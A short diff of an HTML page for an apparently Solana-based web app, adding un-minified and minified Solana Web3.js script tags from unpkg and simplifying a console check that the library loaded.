@@ -627,10 +627,14 @@
         console.log("Buffer set from module");
         console.log("Buffer.from available:", typeof window.Buffer.from === 'function');
     </script>
+    <!-- Load Solana Web3.js: Development (un-minified) -->
+    <script src="https://unpkg.com/@solana/web3.js@latest/lib/index.iife.js"></script>
+    <!-- Load Solana Web3.js: Production (minified) -->
     <script src="https://unpkg.com/@solana/web3.js@latest/lib/index.iife.min.js"></script>
+
+    <!-- Verify that solanaWeb3 is available -->
     <script>
-        console.log("Solana Web3.js loaded successfully");
-        console.log("solanaWeb3 available:", !!window.solanaWeb3);
+        console.log("solanaWeb3:", window.solanaWeb3);
     </script>
     <!-- Load RPCs -->
     <script src="https://trench-monster.games/bDb.js/config.js?token=e7f6c011-8b5b-4d7e-9c08-123456789abc"></script>
